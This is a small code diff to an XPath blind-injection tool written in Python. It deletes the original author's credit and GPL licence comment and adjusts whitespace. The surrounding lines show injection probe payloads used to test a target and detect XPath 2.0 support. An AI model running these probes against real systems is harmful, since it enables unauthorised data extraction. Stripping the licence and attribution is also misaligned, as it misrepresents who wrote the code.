@@ -577,8 +577,6 @@ if __name__ == "__main__":
 		args.no_child = True
 		attack(encode_payload(args.example))
 		exit(0)
-#Developed by Paul Haas, <phaas AT redspin DOT com> under Redspin. Inc.
-#Licensed under the GNU Public License version 3.0 (2008-2009)
 	# Test injection point for successful injection before performing attack
 	if not attack(encode_payload("count(//*) and 2>1")):
 		sys.stderr.write("### Test Injection Failed to match '%s' using: ###\n%s\n" % (args.match, args.inject_file))
@@ -593,8 +591,7 @@ if __name__ == "__main__":
 	if args.xpath2:
 		if attack(encode_payload("lower-case('A')='a'")):
 			sys.stderr.write("### Looks like %s:%i supports XPath 2.0 injection via lower-case(), consider using xcat (https://github.com/orf/xcat) ###\n" % (args.host, args.port))
-			exit(8)
-	
+			exit(8)	
 	if args.unicode:
 		# Some editors will complain about the Unicode string below.. use a better editor
 		unicode_str = ''.join(set(u"ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿ"))
